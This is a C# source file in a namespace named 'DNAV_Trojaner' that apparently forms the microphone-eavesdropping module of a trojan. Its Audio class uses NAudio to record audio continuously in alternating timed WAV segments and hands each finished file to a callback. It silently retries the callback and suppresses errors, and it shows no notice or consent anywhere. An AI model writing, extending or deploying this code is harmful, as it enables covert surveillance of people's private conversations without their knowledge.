using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using NAudio.Wave;

namespace DNAV_Trojaner
{
    public class Audio
    {
        //! benötigt: https://github.com/naudio/NAudio/releases
        private WaveInEvent waveSource = null;
        private WaveFileWriter waveFile = null;
        private WaveInEvent waveSourceB = null;
        private WaveFileWriter waveFileB = null;
        private bool loop = true;
        private bool controller = true;
        private string path = "default";
        private int time = 100; // Dauer der Durchläufe in Sekunden

        private void DataAvailable(WaveFileWriter wF,WaveInEventArgs e){
             if (wF != null) {
                wF.Write(e.Buffer, 0, e.BytesRecorded);
                wF.Flush();
            }
        }

        private void RecordingStopped(WaveInEvent wS, WaveFileWriter wF){
            if (wS != null) {
                wS.Dispose();
                wS = null;
            }

            if (wF != null) {
                wF.Dispose();
                wF = null;
            }
        }
        private void WaveSource_DataAvailable(object sender, WaveInEventArgs e) {
            DataAvailable(waveFile,e);
        }

        private void WaveSource_RecordingStopped(object sender, StoppedEventArgs e) {
           RecordingStopped(waveSource,waveFile);
        }

        private void WaveSourceB_DataAvailable(object sender, WaveInEventArgs e) {
            DataAvailable(waveFileB,e);
        }

        private void WaveSourceB_RecordingStopped(object sender, StoppedEventArgs e) {
           RecordingStopped(waveSourceB,waveFileB);
        }
        private void Ini() {
            controller = true;
            Ini("");
        }
        private void Ini(string suffix) {
            if (controller) {
                controller = false;
                waveSource = new WaveInEvent();
                waveSource.WaveFormat = new WaveFormat(44100, 1);
                waveSource.DataAvailable += new EventHandler < WaveInEventArgs > (WaveSource_DataAvailable);
                waveSource.RecordingStopped += new EventHandler < StoppedEventArgs > (WaveSource_RecordingStopped);
                waveFile = new WaveFileWriter(path + suffix + ".wav", waveSource.WaveFormat);
            } else {
                controller = true;
                waveSourceB = new WaveInEvent();
                waveSourceB.WaveFormat = new WaveFormat(44100, 1);
                waveSourceB.DataAvailable += new EventHandler < WaveInEventArgs > (WaveSourceB_DataAvailable);
                waveSourceB.RecordingStopped += new EventHandler < StoppedEventArgs > (WaveSourceB_RecordingStopped);
                waveFileB = new WaveFileWriter(path + suffix + ".wav", waveSourceB.WaveFormat);
            }
        }
        public delegate void Execution(string path);

        public void Start() { // Nur Start
            Ini();
            waveSource.StartRecording();
        }

        public void Start(int interval) { // Start mit Loop
            Start(interval, (path) => {});
        }
        public void Start(int interval, Execution func) { // Start mit Loop und Funktion an jedem Ende
            time = interval;
            loop = true;
            int i = 1;
            controller = true;
            Ini("" + (i++));
            waveSource.StartRecording();
            while (loop) {
                System.Threading.Thread.Sleep(time * 1000);
                if (controller) {
                    waveSourceB.StopRecording();
                } else {
                    waveSource.StopRecording();
                }
                Ini("" + (i++));
                if (controller) {
                    waveSourceB.StartRecording();
                } else {
                    waveSource.StartRecording();
                }
                while (true) {
                    try {
                        func(path + (i - 2));
                        break;
                    } catch (Exception e) {}
                }
            }
        }

        public void Stop() { // Aufnahme Stop
            loop = false;
            waveSource.StopRecording();
        }

        public Audio(string p) {
            path = p;
        }
        public Audio() {}

    }
}
